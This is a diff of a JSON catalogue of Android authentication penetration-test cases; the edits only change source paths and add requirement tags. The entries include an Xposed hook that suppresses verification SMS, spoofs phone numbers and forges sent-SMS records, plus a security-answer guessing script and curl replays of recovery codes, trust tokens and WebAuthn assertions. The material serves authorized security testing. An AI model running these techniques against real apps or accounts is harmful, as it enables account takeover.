-   "how": "```bash\ngrep -rnE 'SMS_RETRIEVED_ACTION|startSmsUserConsent|SmsRetriever|EXTRA_CONSENT_INTENT|EXTRA_SMS_MESSAGE' jadx_out/sources\ngrep -rn 'registerReceiver' jadx_out/sources | grep -i sms      # two-arg form is the bug\ngrep -nB2 -A8 'com.google.android.gms.auth.api.phone.SMS_RETRIEVED' out/AndroidManifest.xml\nadb shell dumpsys activity broadcasts | sed -n '/com.target.app/,/^$/p'\n```\nThe documented-correct form is `registerReceiver(receiver, filter, SmsRetriever.SEND_PERMISSION, null)`.",
+   "how": "```bash\ngrep -rnE 'SMS_RETRIEVED_ACTION|startSmsUserConsent|SmsRetriever|EXTRA_CONSENT_INTENT|EXTRA_SMS_MESSAGE' $DEC/jadx/sources\ngrep -rn 'registerReceiver' $DEC/jadx/sources | grep -i sms      # two-arg form is the bug\ngrep -nB2 -A8 'com.google.android.gms.auth.api.phone.SMS_RETRIEVED' out/AndroidManifest.xml\nadb shell dumpsys activity broadcasts | sed -n '/com.target.app/,/^$/p'\n```\nThe documented-correct form is `registerReceiver(receiver, filter, SmsRetriever.SEND_PERMISSION, null)`.",
    "proof": "From an unprivileged app, `sendBroadcast` of `com.google.android.gms.auth.api.phone.SMS_RETRIEVED` with a crafted `EXTRA_STATUS` / `EXTRA_SMS_MESSAGE`, and the app consuming the injected code; **or** the app launching the attacker's `EXTRA_CONSENT_INTENT`, which turns the receiver into an arbitrary-Intent-launch gadget running with the victim's UID.",
    "escalation": "OTP injection → D13-045/065 → ATO. Consent-intent launch → **D08 intent redirection** and the self-grant gadget (the victim app grants your app read access to its own `FileProvider` URI). The BAL constraint applies at **API 34+**; note it.",
    "ruled_out_when": "The receiver is registered with `SmsRetriever.SEND_PERMISSION` (or `RECEIVER_NOT_EXPORTED`), **or** the injected code is rejected because the flow carries a handshake UUID plus server-side verification — trace that handshake before claiming OTP injection; in the corpus the injection variant is usually a recorded negative while the arbitrary-Intent-launch variant is the real finding. Check both branches of `onReceive`."
@@ -2226,8 +2326,10 @@
     "AM-04"
    ],
    "applies_to": "All apps that auto-fill an SMS OTP. Mitigated on **Android 15+**; LEGACY exposure on ≤ 14 — state the client's minimum supported API",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "device",
+   "requires_tags": [
+    "device"
+   ],
    "maps_to": "Android developer security-tips, SMS section (verbatim): \"SMS is neither encrypted nor strongly authenticated on either the network or the device… Don't rely on unauthenticated SMS data to perform sensitive commands\"; Android 15 behaviour changes (untrusted `NotificationListenerService` implementations cannot read unredacted OTP content; trusted companion-device associations exempt); AOSP `Permissions.md` hard/soft-restricted SMS permissions",
    "record": "",
    "legacy_meta": {},
@@ -2252,7 +2354,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Two halves. (a) Does the app hold `READ_SMS`/`RECEIVE_SMS` with a plain `BroadcastReceiver` when the SMS Retriever API — which needs no permission and binds the message to the app hash — would do? That grant reads the user's entire SMS corpus, not just the app's OTP. (b) On Android 15, does the app's OTP *delivery* route around the platform's redaction (code in the notification **title** rather than the body, in an accessibility node, or in the clipboard), and has it obtained a companion-device association purely to keep reading them?",
-   "how": "```bash\ngrep -nE 'RECEIVE_SMS|READ_SMS|BROADCAST_SMS' out/AndroidManifest.xml\ngrep -rnE 'SmsRetriever|SmsRetrieverClient|SMS_RETRIEVED_ACTION|createAppSpecificSmsToken|Telephony.Sms|AUTOFILL_HINT_SMS_OTP' jadx_out/sources\ngrep -rn 'CompanionDeviceManager\\|REQUEST_COMPANION' out/AndroidManifest.xml jadx_out/sources\nadb shell cmd role get-role-holders android.app.role.SMS\nadb shell cmd notification allow_listener com.poc.attacker/.Listener\nadb shell dumpsys notification | grep -i 'listener\\|redact'\n```",
+   "how": "```bash\ngrep -nE 'RECEIVE_SMS|READ_SMS|BROADCAST_SMS' out/AndroidManifest.xml\ngrep -rnE 'SmsRetriever|SmsRetrieverClient|SMS_RETRIEVED_ACTION|createAppSpecificSmsToken|Telephony.Sms|AUTOFILL_HINT_SMS_OTP' $DEC/jadx/sources\ngrep -rn 'CompanionDeviceManager\\|REQUEST_COMPANION' out/AndroidManifest.xml $DEC/jadx/sources\nadb shell cmd role get-role-holders android.app.role.SMS\nadb shell cmd notification allow_listener com.poc.attacker/.Listener\nadb shell dumpsys notification | grep -i 'listener\\|redact'\n```",
    "proof": "The app holding `READ_SMS` while using a plain receiver for the OTP, plus a demonstration that the same grant reads unrelated messages (`content query --uri content://sms/inbox`). For (b), a test listener receiving an **unredacted** 6-digit code on Android 15 — proving the delivery sits outside the platform's redaction heuristics. Run the same PoC on the client's minimum supported API and document exactly which fleet versions are exposed.",
    "escalation": "Full SMS read → OTPs for *other* services → multi-account takeover; → D25 if the app holds the SMS Role.",
    "ruled_out_when": "The app uses `SmsRetriever` (or `createAppSpecificSmsToken`) with no SMS permission in the manifest, and a listener on Android 15 receives a redacted value. The clean negative is worth recording, because the SMS Retriever path also closes D13-048's channel 2."
@@ -2273,8 +2375,11 @@
     "AM-12"
    ],
    "applies_to": "All apps using SMS/MSISDN as an authentication factor, and carrier silent-auth SDKs",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "device, root",
+   "requires_tags": [
+    "device",
+    "root"
+   ],
    "maps_to": "HackTricks `android-anti-instrumentation-and-ssl-pinning-bypass.md` \"LSPosed/Xposed Hooking Abuse (Telephony/SMS)\", citing CloudSEK research on remote SMS injection and identity spoofing in payment ecosystems",
    "record": "",
    "legacy_meta": {},
@@ -2297,7 +2402,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Flows that bind an account to a number by reading `TelephonyManager.getLine1Number()`, `SubscriptionInfo.getNumber()`, or by checking the local SMS provider for a \"sent\" record, are forgeable. Separately, silent-auth SDKs (OTPLESS, IPification, Truecaller, carrier-hosted) often use **cleartext** carrier endpoints — trace what assertion is sent and whether it is bound to the session.",
-   "how": "```java\n// suppress the outgoing verification SMS while capturing its content\nXposedHelpers.findAndHookMethod(\"android.telephony.SmsManager\", lp.classLoader, \"sendTextMessage\",\n  String.class, String.class, String.class, PendingIntent.class, PendingIntent.class,\n  new XC_MethodHook(){ protected void beforeHookedMethod(MethodHookParam p){\n      String body = (String) p.args[2]; /* exfiltrate */ p.setResult(null); } });\n// spoof the line number\nXposedHelpers.findAndHookMethod(\"android.telephony.TelephonyManager\", lp.classLoader,\n  \"getLine1Number\", new XC_MethodHook(){ protected void afterHookedMethod(MethodHookParam p){\n      p.setResult(spoofedMsisdn); } });\n```\n```java\n// plant a fake \"Sent\" record so local-history checks pass\nContentValues v = new ContentValues();\nv.put(\"address\", dest); v.put(\"body\", body); v.put(\"type\", 2); v.put(\"status\", 0);\ncontext.getContentResolver().insert(Uri.parse(\"content://sms/sent\"), v);\n```\n```bash\n# silent-auth: cross-reference the NSC's cleartext hosts (D14) against the SDK's endpoints\ngrep -rnE 'otpless|ipification|truecaller|sekura|silentAuth|headerEnrichment' jadx_out/sources\ngrep -n 'cleartextTrafficPermitted' out/res/xml/network_security_config.xml\n```",
+   "how": "```java\n// suppress the outgoing verification SMS while capturing its content\nXposedHelpers.findAndHookMethod(\"android.telephony.SmsManager\", lp.classLoader, \"sendTextMessage\",\n  String.class, String.class, String.class, PendingIntent.class, PendingIntent.class,\n  new XC_MethodHook(){ protected void beforeHookedMethod(MethodHookParam p){\n      String body = (String) p.args[2]; /* exfiltrate */ p.setResult(null); } });\n// spoof the line number\nXposedHelpers.findAndHookMethod(\"android.telephony.TelephonyManager\", lp.classLoader,\n  \"getLine1Number\", new XC_MethodHook(){ protected void afterHookedMethod(MethodHookParam p){\n      p.setResult(spoofedMsisdn); } });\n```\n```java\n// plant a fake \"Sent\" record so local-history checks pass\nContentValues v = new ContentValues();\nv.put(\"address\", dest); v.put(\"body\", body); v.put(\"type\", 2); v.put(\"status\", 0);\ncontext.getContentResolver().insert(Uri.parse(\"content://sms/sent\"), v);\n```\n```bash\n# silent-auth: cross-reference the NSC's cleartext hosts (D14) against the SDK's endpoints\ngrep -rnE 'otpless|ipification|truecaller|sekura|silentAuth|headerEnrichment' $DEC/jadx/sources\ngrep -n 'cleartextTrafficPermitted' out/res/xml/network_security_config.xml\n```",
    "proof": "The app completing SIM binding / number verification for an MSISDN the device does not own, with the carrier never receiving the SMS. For silent auth, the cleartext request containing the subscriber assertion, plus a successful replay against your own account showing it is not session-bound.",
    "escalation": "→ D14 (the MitM harness that captures the cleartext assertion) → D23 (payment identity).",
    "ruled_out_when": "The binding is established by a **backend-issued challenge** the server verifies against carrier-side receipt, rather than by client-reported telephony state; and the silent-auth assertion is delivered over TLS and bound to the app's own session. Cleartext exposure alone with no usable assertion is Low–Medium (the corpus's worked calibration: a network security config permitting cleartext to five such hosts rated Low–Medium); **Critical** only if the captured assertion authenticates."
@@ -2317,8 +2422,10 @@
     "AM-01"
    ],
    "applies_to": "All apps with SMS-based auth or recovery; dominant in OTP-first / phone-as-identity markets",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "ATT&CK T1451 SIM Card Swap (\"adversaries may use SMS-based authentication to log into banking and/or cryptocurrency accounts, then transfer funds to adversary-controlled wallets\"; LAPSUS$, Scattered Spider; mitigation M1011 \"Use hardware tokens, biometrics, and non-SMS authentication methods\"); T1660 Phishing (including AI voice cloning for deepfake vishing)",
    "record": "",
    "legacy_meta": {},
@@ -2343,7 +2450,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "A design finding you can demonstrate without any device access. Walk every recovery flow — \"Forgot password\", \"New device\", \"Lost 2FA\" — and record which factors each accepts. Is a number-only path sufficient *anywhere*? Then the recycling variant: does re-verifying a number hand over the previous owner's account intact, and does the app ship **any** signal it could use (device binding, installation id, re-KYC, a cooling period, a re-consent step)?",
-   "how": "```bash\ngrep -rnE 'getLine1Number|getSubscriberId|getSimSerialNumber|ICCID|IMSI|device_id|installation_id|firstSeen|number_changed|reverify' jadx_out/sources\n# capture the recovery API calls: /auth/recover, /otp/send, /device/trust, /mfa/reset\n# then, on a fresh install + fresh device id, complete OTP login for a re-verified number and diff /me\ncurl -s https://api.target/v1/me -H \"Authorization: Bearer $T\" \\\n  | jq '{id,created_at,kyc_status,wallet_balance,linked_cards,address_count}'\n```",
+   "how": "```bash\ngrep -rnE 'getLine1Number|getSubscriberId|getSimSerialNumber|ICCID|IMSI|device_id|installation_id|firstSeen|number_changed|reverify' $DEC/jadx/sources\n# capture the recovery API calls: /auth/recover, /otp/send, /device/trust, /mfa/reset\n# then, on a fresh install + fresh device id, complete OTP login for a re-verified number and diff /me\ncurl -s https://api.target/v1/me -H \"Authorization: Bearer $T\" \\\n  | jq '{id,created_at,kyc_status,wallet_balance,linked_cards,address_count}'\n```",
    "proof": "A complete recovery performed using only possession of the phone number (simulate with a second SIM/eSIM or a number you control on the test account) — screen-record the full flow plus the resulting session token. For the recycling variant: a fresh install on a fresh device returning a `/me` with a pre-existing `created_at`, non-zero balance, prior KYC status and saved payment instruments.",
    "escalation": "→ D23 (funds movement). Where the app *collects* a device-binding field and ignores it, that unused field is both the fix and the proof of a missing control — quote it.",
    "ruled_out_when": "Every recovery path requires a second factor the number alone does not satisfy (a password, a trusted-device approval, a hardware key), **and** a re-verified number on a new device triggers a cooling period or re-KYC rather than an immediate handover. Record which factor closes it; that is what the client will want to keep."
@@ -2363,8 +2470,10 @@
     "AM-01"
    ],
    "applies_to": "All recovery flows",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "`hunt-forgot-password` pattern library (H1 #173551, #685007); `hunt-ato` Paths 1–4",
    "record": "",
    "legacy_meta": {},
@@ -2409,8 +2518,10 @@
     "AM-01"
    ],
    "applies_to": "Any backend that builds absolute URLs from the request host",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "`hunt-host-header` Patterns 1, 2, 6; `hunt-ato` Path 1; disclosed: $4,500 for `Host`, $3,500 for `X-Forwarded-Host`",
    "record": "",
    "legacy_meta": {},
@@ -2450,8 +2561,10 @@
     "AM-01"
    ],
    "applies_to": "All recovery flows",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "`hunt-brute-force` Pattern 2 ($6,500); `hunt-ato` Path 3",
    "record": "",
    "legacy_meta": {},
@@ -2495,8 +2608,11 @@
     "AM-03"
    ],
    "applies_to": "All apps offering passwordless / magic-link / email-verification flows",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "deeplink, backend-api",
+   "requires_tags": [
+    "deeplink",
+    "backend-api"
+   ],
    "maps_to": "MASVS-AUTH-3 (deep links and MFA code generators \"all need to be implemented securely\"); CVE-2026-26123 (Microsoft Authenticator sign-in code in an unclaimed `ms-msa://` deep link, interceptable by any sibling app)",
    "record": "",
    "legacy_meta": {},
@@ -2523,7 +2639,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Three mobile-specific failures on the same token. (1) The scheme is unverified, so another app claims it and harvests the token. (2) The link opens in the app's own `WebView`, where the token lands in `Referer`, history and cache. (3) Something other than the user opens it — an in-app link preview, a notification `setContentIntent` that pre-resolves the URL, or a security scanner — burning or leaking the token.",
-   "how": "```bash\n# is the host actually verified?\nadb shell pm get-app-links com.target.app             # require state 'verified'\nadb shell dumpsys package domain-preferred-apps | sed -n '/com.target.app/,/^$/p'\ncurl -s https://app.target/.well-known/assetlinks.json | jq .\nadb shell pm query-activities -a android.intent.action.VIEW -d \"https://app.target/magic?token=x\"\n# claim the scheme from a stub app and request a reset\nadb shell am start -a android.intent.action.VIEW -d 'target://reset?token=TESTTOKEN'\n# does the app load it in a WebView (token then leaves in Referer)?\ngrep -rnE 'reset|forgot|magic|passwordless|verifyEmail' jadx_out/sources | grep -nE 'loadUrl|WebView'\n# is a mere GET enough to consume it?\nfor n in 1 2; do curl -s -o /dev/null -w \"GET#$n [%{http_code}]\\n\" \"https://app.target/magic?token=$T\"; done\n# does the app itself fetch it on push/notification arrival?\nadb logcat -c; # send the magic link; then:\nadb logcat -d | grep -iE 'prefetch|preview|magic|LinkPreview|OpenGraph'\n```",
+   "how": "```bash\n# is the host actually verified?\nadb shell pm get-app-links com.target.app             # require state 'verified'\nadb shell dumpsys package domain-preferred-apps | sed -n '/com.target.app/,/^$/p'\ncurl -s https://app.target/.well-known/assetlinks.json | jq .\nadb shell pm query-activities -a android.intent.action.VIEW -d \"https://app.target/magic?token=x\"\n# claim the scheme from a stub app and request a reset\nadb shell am start -a android.intent.action.VIEW -d 'target://reset?token=TESTTOKEN'\n# does the app load it in a WebView (token then leaves in Referer)?\ngrep -rnE 'reset|forgot|magic|passwordless|verifyEmail' $DEC/jadx/sources | grep -nE 'loadUrl|WebView'\n# is a mere GET enough to consume it?\nfor n in 1 2; do curl -s -o /dev/null -w \"GET#$n [%{http_code}]\\n\" \"https://app.target/magic?token=$T\"; done\n# does the app itself fetch it on push/notification arrival?\nadb logcat -c; # send the magic link; then:\nadb logcat -d | grep -iE 'prefetch|preview|magic|LinkPreview|OpenGraph'\n```",
    "proof": "The stub app's `onCreate` logging the real reset token from a mail sent to the victim's address — then using it to set a password and log in. Or Burp showing the token in the `Referer` of a third-party resource load inside the reset WebView. Or (for the prefetch variant) the app's own outbound request consuming the token before the user taps, producing a repeatable denial-of-login.",
    "escalation": "→ D09 (App Link verification state) → ATO; the replayable-link variant chains with any log, referrer or notification-content leak in D20.",
    "ruled_out_when": "The link is an `https` App Link whose verification state is `verified` (so no chooser and no competing handler), the token is consumed only on an explicit user confirmation (POST, not GET), it is single-use, and the reset page loads no third-party resources that would carry a `Referer`. Note that `autoVerify` closes the custom-scheme variant only — it does nothing about the `Referer` variant, so test both."
@@ -2545,8 +2661,10 @@
     "AM-11"
    ],
    "applies_to": "All apps with 2FA recovery codes",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "`hunt-mfa-bypass` \"Recovery code dump via /api/me\"; MASTG-TEST-0315 (notification/screen exposure)",
    "record": "",
    "legacy_meta": {},
@@ -2569,7 +2687,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Recovery codes are password-equivalent and permanently bypass 2FA. Four failures: they are returned by a fat profile endpoint; they are generated on-device from a local seed; they are rendered on a screen without `FLAG_SECURE`, so they land in Recents and screenshots; or they are not single-use.",
-   "how": "```bash\n# a) fat profile endpoint — hit it with BOTH a pre-MFA and a full session\nfor T in \"$PRE_MFA\" \"$FULL\"; do\n  curl -s https://api.target/api/me -H \"Authorization: Bearer $T\" \\\n    | grep -oiE 'recovery_codes|backup_codes|mfa\\.recovery|two_factor_recovery_codes|\"[A-Z0-9]{4}-[A-Z0-9]{4}\"'\ndone\n# b) client-side generation\ngrep -rnE 'recoveryCode|backupCode|scratchCode|generateCodes|SecureRandom' jadx_out/sources\n# c) screen protection\ngrep -rn 'FLAG_SECURE\\|setRecentsScreenshotEnabled' jadx_out/sources\nadb shell dumpsys window | grep -iE 'FLAG_SECURE|mCurrentFocus'\nadb exec-out screencap -p > codes.png            # succeeds => no FLAG_SECURE\n# d) reuse\nfor n in 1 2; do curl -s -o /dev/null -w \"recover#$n [%{http_code}]\\n\" \\\n  -X POST https://api.target/v1/2fa/recover -d \"code=$C\"; done\n```",
+   "how": "```bash\n# a) fat profile endpoint — hit it with BOTH a pre-MFA and a full session\nfor T in \"$PRE_MFA\" \"$FULL\"; do\n  curl -s https://api.target/api/me -H \"Authorization: Bearer $T\" \\\n    | grep -oiE 'recovery_codes|backup_codes|mfa\\.recovery|two_factor_recovery_codes|\"[A-Z0-9]{4}-[A-Z0-9]{4}\"'\ndone\n# b) client-side generation\ngrep -rnE 'recoveryCode|backupCode|scratchCode|generateCodes|SecureRandom' $DEC/jadx/sources\n# c) screen protection\ngrep -rn 'FLAG_SECURE\\|setRecentsScreenshotEnabled' $DEC/jadx/sources\nadb shell dumpsys window | grep -iE 'FLAG_SECURE|mCurrentFocus'\nadb exec-out screencap -p > codes.png            # succeeds => no FLAG_SECURE\n# d) reuse\nfor n in 1 2; do curl -s -o /dev/null -w \"recover#$n [%{http_code}]\\n\" \\\n  -X POST https://api.target/v1/2fa/recover -d \"code=$C\"; done\n```",
    "proof": "Recovery codes in a response body (then used to complete MFA); or `codes.png` containing them plus the same content visible in the Recents thumbnail; or two consecutive 200s for the same code.",
    "escalation": "→ MFA bypass → ATO. Codes returned to a **pre-MFA** session are Critical because the second factor is defeated by a stolen password alone.",
    "ruled_out_when": "The codes are generated server-side, stored as hashes, never returned after enrolment (the endpoint returns them exactly once, at generation), the screen sets `FLAG_SECURE`, and each code is refused on second use. The pre-MFA test is the one to run first: it is a different code path from the authenticated one."
@@ -2589,8 +2707,10 @@
     "AM-01"
    ],
    "applies_to": "Apps with knowledge-based recovery",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "`hunt-ato` Path 8",
    "record": "",
    "legacy_meta": {},
@@ -2614,7 +2734,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Security answers are low-entropy and the endpoint is usually unthrottled. Two extra angles that are frequently missed: the answer may be echoed in `/api/me` or in the recovery page's own source (a client-side-only check), and the *question itself* may reveal OSINT-able PII about the account holder.",
-   "how": "```bash\n# is the answer client-side?\ncurl -s https://api.target/v1/recovery/questions?email=victim@example.com | jq .\ngrep -rniE 'securityQuestion|securityAnswer|recoveryAnswer|challengeAnswer' jadx_out/sources\n# unthrottled guessing against a controlled \"victim\"\npython3 - <<'PY'\nimport requests\nanswers = [\"smith\",\"london\",\"fluffy\",\"toyota\",\"1990\",\"st marys\"]\nfor a in answers:\n    r = requests.post(\"https://api.target/v1/recovery/answer\",\n                      json={\"email\": VICTIM, \"answer\": a}, timeout=10)\n    print(a, r.status_code, len(r.content))\nPY\n```",
+   "how": "```bash\n# is the answer client-side?\ncurl -s https://api.target/v1/recovery/questions?email=victim@example.com | jq .\ngrep -rniE 'securityQuestion|securityAnswer|recoveryAnswer|challengeAnswer' $DEC/jadx/sources\n# unthrottled guessing against a controlled \"victim\"\npython3 - <<'PY'\nimport requests\nanswers = [\"smith\",\"london\",\"fluffy\",\"toyota\",\"1990\",\"st marys\"]\nfor a in answers:\n    r = requests.post(\"https://api.target/v1/recovery/answer\",\n                      json={\"email\": VICTIM, \"answer\": a}, timeout=10)\n    print(a, r.status_code, len(r.content))\nPY\n```",
    "proof": "Recovery completed on a controlled \"victim\" account without the password — or the answer disclosed in a response body, which is the stronger finding because it needs no guessing at all.",
    "escalation": "→ ATO; the disclosed-question variant also feeds D20 as PII exposure.",
    "ruled_out_when": "The answer is never returned by any endpoint, the answer endpoint throttles (and survives D13-040's key rotation), and the question set is generic rather than PII-bearing. If the flow requires the security answer **in addition to** a delivered OTP rather than instead of it, record that as the closing control."
@@ -2634,8 +2754,10 @@
     "AM-01"
    ],
    "applies_to": "Any challenge-gated auth endpoint",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "`hunt-captcha-bypass` (H1 #206653, #210417, #246801)",
    "record": "",
    "legacy_meta": {},
@@ -2679,8 +2801,11 @@
     "AM-01"
    ],
    "applies_to": "All apps with self-service registration, especially those offering both password and social signup",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api, two-accounts",
+   "requires_tags": [
+    "backend-api",
+    "two-accounts"
+   ],
    "maps_to": "Sudhodanan & Paverd, \"Pre-hijacked accounts: An Empirical Study of Security Failures in User Account Creation on the Web\", arXiv:2205.10174 — Classic-Federated Merge, Unexpired Session, Trojan Identifier, Unexpired Email Change, Non-verifying IdP",
    "record": "",
    "legacy_meta": {},
@@ -2724,8 +2849,11 @@
     "AM-01"
    ],
    "applies_to": "All; particularly apps with separate mobile and web auth services",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api, two-accounts",
+   "requires_tags": [
+    "backend-api",
+    "two-accounts"
+   ],
    "maps_to": "H1 #187714 (Vine, Medium, $280 — \"overwrite account associated with email via android application\"); Gowthams `password-reset.md` normalisation test-case block",
    "record": "",
    "legacy_meta": {},
@@ -2768,8 +2896,10 @@
     "AM-01"
    ],
    "applies_to": "All",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "H1 #57764 (Coinbase, $100 — \"ByPassing the email Validation Email on Sign up process in mobile apps\")",
    "record": "",
    "legacy_meta": {},
@@ -2812,8 +2942,10 @@
     "AM-01"
    ],
    "applies_to": "All",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "`hunt-brute-force` Patterns 3 and 6; sehno → Authentication → \"Test for user enumeration\"",
    "record": "",
    "legacy_meta": {},
@@ -2857,8 +2989,10 @@
     "AM-01"
    ],
    "applies_to": "Any MFA-protected backend; **mobile login endpoints are a prime \"other handler\"**",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "`hunt-mfa-bypass` pattern library (H1 #418767, $10,000 — 2FA-requirement bypass letting a user skip program restrictions; #1050244 — 2FA-enforcement bypass by following the post-login redirect directly; #1247108, $1,564)",
    "record": "",
    "legacy_meta": {},
@@ -2898,8 +3032,10 @@
     "AM-01"
    ],
    "applies_to": "Multi-step auth flows",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "`hunt-mfa-bypass` \"MFA-step skip via direct post-login navigation\"",
    "record": "",
    "legacy_meta": {},
@@ -2941,8 +3077,10 @@
     "AM-01"
    ],
    "applies_to": "Accounts offering more than one second factor",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "`hunt-mfa-bypass` pattern library (H1 #665722, $2,500 — an \"email\" MFA mode allowing bypass)",
    "record": "",
    "legacy_meta": {},
@@ -2985,8 +3123,10 @@
     "AM-02"
    ],
    "applies_to": "All",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "H1 #155774 (Slack, $500), #667740 (Grammarly, \"Can register any mobile number in MFA without current code\"), #2762462 (MTN, Critical 9.1), #649533 (adding 2FA without verifying email first), #2588329 (OTP flaw allowing binding of any phone number)",
    "record": "",
    "legacy_meta": {},
@@ -3030,8 +3170,10 @@
     "AM-11"
    ],
    "applies_to": "Account-settings APIs",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "`hunt-mfa-bypass` \"MFA-disable / TOTP-regen without re-auth\"",
    "record": "",
    "legacy_meta": {},
@@ -3074,8 +3216,10 @@
     "AM-01"
    ],
    "applies_to": "Apps offering device trust",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "`hunt-mfa-bypass` \"Remember this device cookie — IP/UA unbound\"",
    "record": "",
    "legacy_meta": {},
@@ -3098,7 +3242,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "A 30-day trust cookie that is a bare bearer of \"MFA already done\". Complete MFA on device A, capture the artefact, and present it from a different IP and User-Agent.",
-   "how": "```bash\ngrep -rniE 'remember_device|trust_token|trusted_device|device_token|skip_mfa|rememberMe' jadx_out/sources\nadb shell run-as com.target.app grep -rl 'trust\\|remember' shared_prefs/ databases/ files/\n# present it from elsewhere\ncurl -s -X POST https://api.target/v1/login -H 'Content-Type: application/json' \\\n  -H 'User-Agent: curl/8.4.0' -b \"trust_token=$TT\" \\\n  -d '{\"email\":\"'\"$U\"'\",\"password\":\"'\"$P\"'\"}' -i | head -20\n```",
+   "how": "```bash\ngrep -rniE 'remember_device|trust_token|trusted_device|device_token|skip_mfa|rememberMe' $DEC/jadx/sources\nadb shell run-as com.target.app grep -rl 'trust\\|remember' shared_prefs/ databases/ files/\n# present it from elsewhere\ncurl -s -X POST https://api.target/v1/login -H 'Content-Type: application/json' \\\n  -H 'User-Agent: curl/8.4.0' -b \"trust_token=$TT\" \\\n  -d '{\"email\":\"'\"$U\"'\",\"password\":\"'\"$P\"'\"}' -i | head -20\n```",
    "proof": "A login from a new IP and a different User-Agent skipping the MFA challenge entirely, with the trust artefact as the only carried state.",
    "escalation": "+ credential stuffing (D13-013) or a password leak → ATO. Also check whether the trust list is visible and revocable in the account UI — if it is not, this becomes the D13-022 invisible-session problem.",
    "ruled_out_when": "The trust artefact is cryptographically bound (a device key, a DPoP-style proof, or a server-side record keyed to a device id the client cannot choose) and is refused from a different network and agent, **and** the trust list is enumerable and revocable by the user. A trust token that merely *contains* a device id is not bound — you can set that too."
@@ -3119,8 +3263,11 @@
     "AM-11"
    ],
    "applies_to": "All apps with an account",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api, device",
+   "requires_tags": [
+    "backend-api",
+    "device"
+   ],
    "maps_to": "MASWE-0023 (Step-Up Authentication Not Implemented for Sensitive Actions, CWE-306 — modes: no re-authentication, step-up not bound to the action, **step-up not enforced server-side**, uniform assurance level); MASVS-AUTH-3. *No Android MASTG-TEST covers step-up — a MASTG gap; this is pure API testing.*",
    "record": "",
    "legacy_meta": {},
@@ -3170,8 +3317,11 @@
     "AM-11"
    ],
    "applies_to": "All",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api, device",
+   "requires_tags": [
+    "backend-api",
+    "device"
+   ],
    "maps_to": "ATT&CK T1640 Account Access Removal (\"Accounts may be deleted, locked, or manipulated (ex: credentials changed) to remove access\"; Monokle \"reset the user's password/PIN\"), T1629.002 Device Lockout; `hunt-business-logic` \"Email change without re-auth\"; H1 #207552 (Khan Academy, Medium — password change with no current-password check)",
    "record": "",
    "legacy_meta": {},
@@ -3217,8 +3367,10 @@
     "AM-01"
    ],
    "applies_to": "WebAuthn / passkey deployments and apps using Credential Manager",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "`hunt-mfa-bypass` \"WebAuthn challenge replay\"; `developer.android.com/identity/sign-in/credential-manager`, `training/sign-in/passkeys` (`GetPublicKeyCredentialOption`, `CreatePublicKeyCredentialRequest`, `requestJson` `challenge` and `rpId`); Digital Asset Links relation `delegate_permission/common.get_login_creds`",
    "record": "",
    "legacy_meta": {},
@@ -3240,7 +3392,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "If the server does not bind the challenge to the session or track challenge uniqueness, the strongest commonly-deployed factor is replayable. Two further questions specific to Android: is the `challenge` server-generated and single-use, and is `rpId` fixed server-side or taken from a client-supplied value?",
-   "how": "```bash\ngrep -rn 'CredentialManager\\|GetCredentialRequest\\|GetPublicKeyCredentialOption\\|CreatePublicKeyCredentialRequest\\|PasswordOption\\|requestJson' jadx_out/sources\n# the credential-sharing association is a DIFFERENT relation from link handling — check the right one\ncurl -s https://target.example/.well-known/assetlinks.json \\\n  | jq '.[] | select(.relation[] | contains(\"get_login_creds\"))'\napksigner verify --print-certs base.apk | grep -i 'SHA-256'      # must match the assetlinks fingerprint\n# then proxy the registration/assertion and replay\ncurl -s -X POST https://api.target/v1/webauthn/verify -H \"Cookie: session=$SECOND_SESSION\" \\\n  -H 'Content-Type: application/json' --data @assertion_from_first_session.json -i\n```",
